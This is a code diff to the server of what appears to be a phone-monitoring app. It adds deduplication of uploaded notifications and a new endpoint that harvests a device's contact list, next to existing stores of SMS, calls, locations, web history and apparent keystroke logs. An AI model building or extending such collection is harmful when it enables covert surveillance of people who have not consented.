@@ -139,17 +139,49 @@ router.post('/sms', requireDevice, async (req: AuthRequest, res) => {
 router.post('/notifications', requireDevice, async (req: AuthRequest, res) => {
   try {
     const { notifications } = notificationSchema.parse(req.body);
-    await prisma.notification.createMany({
-      data: notifications.map((n) => ({
-        deviceId: req.deviceId!,
-        appPackage: n.appPackage,
-        appName: n.appName,
-        title: n.title,
-        text: n.text,
-        timestamp: new Date(n.timestamp),
-      })),
+    const deviceId = req.deviceId!;
+    const filtered = notifications.filter((n) => {
+      const text = (n.text || '').trim();
+      const title = (n.title || '').trim();
+      if (!text && !title) return false;
+      if (text.length < 2 && title.length < 2) return false;
+      if (title === 'Sohbet görünümü' && text.length < 8) return false;
+      return true;
     });
-    res.json({ ok: true, count: notifications.length });
+
+    const unique = new Map<string, typeof filtered[number]>();
+    for (const n of filtered) {
+      const key = `${n.appPackage}|${n.title || ''}|${n.text || ''}`;
+      unique.set(key, n);
+    }
+
+    let created = 0;
+    for (const n of unique.values()) {
+      const ts = new Date(n.timestamp);
+      const since = new Date(ts.getTime() - 3 * 60 * 1000);
+      const exists = await prisma.notification.findFirst({
+        where: {
+          deviceId,
+          appPackage: n.appPackage,
+          title: n.title || '',
+          text: n.text || '',
+          timestamp: { gte: since },
+        },
+      });
+      if (exists) continue;
+      await prisma.notification.create({
+        data: {
+          deviceId,
+          appPackage: n.appPackage,
+          appName: n.appName,
+          title: n.title,
+          text: n.text,
+          timestamp: ts,
+        },
+      });
+      created++;
+    }
+    res.json({ ok: true, count: created });
   } catch (e) {
     if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
     console.error('POST /data error:', e);
@@ -422,7 +454,44 @@ router.get('/social/:deviceId', requireAuth, async (req: AuthRequest, res) => {
   res.json(notifications);
 });
 
-type DataType = 'calls' | 'sms' | 'notifications' | 'locations' | 'web-history' | 'input-logs' | 'media' | 'installed-apps';
+const contactsSchema = z.object({
+  contacts: z.array(z.object({
+    name: z.string(),
+    phoneNumber: z.string(),
+  })),
+});
+
+router.post('/contacts', requireDevice, async (req: AuthRequest, res) => {
+  try {
+    const { contacts } = contactsSchema.parse(req.body);
+    for (const c of contacts) {
+      const phone = c.phoneNumber.replace(/\s+/g, '');
+      if (phone.length < 6) continue;
+      await prisma.contact.upsert({
+        where: { deviceId_phoneNumber: { deviceId: req.deviceId!, phoneNumber: phone } },
+        update: { name: c.name, updatedAt: new Date() },
+        create: { deviceId: req.deviceId!, name: c.name, phoneNumber: phone },
+      });
+    }
+    res.json({ ok: true, count: contacts.length });
+  } catch (e) {
+    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
+    res.status(500).json({ error: 'Rehber kaydı başarısız' });
+  }
+});
+
+router.get('/contacts/:deviceId', requireAuth, async (req: AuthRequest, res) => {
+  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
+  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
+  const contacts = await prisma.contact.findMany({
+    where: { deviceId: req.params.deviceId },
+    orderBy: { name: 'asc' },
+    take: 2000,
+  });
+  res.json(contacts);
+});
+
+type DataType = 'calls' | 'sms' | 'notifications' | 'locations' | 'web-history' | 'input-logs' | 'media' | 'installed-apps' | 'contacts';
 
 router.delete('/:type/:deviceId', requireAuth, async (req: AuthRequest, res) => {
   const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
@@ -442,6 +511,7 @@ router.delete('/:type/:deviceId', requireAuth, async (req: AuthRequest, res) => 
         prisma.mediaCapture.deleteMany({ where: { deviceId } }),
         prisma.appChangeLog.deleteMany({ where: { deviceId } }),
         prisma.installedApp.deleteMany({ where: { deviceId } }),
+        prisma.contact.deleteMany({ where: { deviceId } }),
       ]);
       return res.json({ ok: true, message: 'Tüm veriler silindi' });
     }
@@ -457,6 +527,7 @@ router.delete('/:type/:deviceId', requireAuth, async (req: AuthRequest, res) => 
         prisma.installedApp.deleteMany({ where: { deviceId } }),
         prisma.appChangeLog.deleteMany({ where: { deviceId } }),
       ]),
+      contacts: () => prisma.contact.deleteMany({ where: { deviceId } }),
     };
     const fn = map[type];
     if (!fn) return res.status(400).json({ error: 'Geçersiz veri tipi' });
@@ -487,6 +558,7 @@ router.get('/export/:type/:deviceId', requireAuth, async (req: AuthRequest, res)
         media: await prisma.mediaCapture.findMany({ where: { deviceId } }),
         installedApps: await prisma.installedApp.findMany({ where: { deviceId } }),
         appChanges: await prisma.appChangeLog.findMany({ where: { deviceId } }),
+        contacts: await prisma.contact.findMany({ where: { deviceId } }),
       };
     } else {
       const map: Record<string, () => Promise<unknown>> = {
@@ -498,6 +570,7 @@ router.get('/export/:type/:deviceId', requireAuth, async (req: AuthRequest, res)
         'input-logs': () => prisma.inputLog.findMany({ where: { deviceId } }),
         media: () => prisma.mediaCapture.findMany({ where: { deviceId } }),
         'installed-apps': () => prisma.installedApp.findMany({ where: { deviceId } }),
+        contacts: () => prisma.contact.findMany({ where: { deviceId } }),
       };
       const fn = map[type];
       if (!fn) return res.status(400).json({ error: 'Geçersiz veri tipi' });
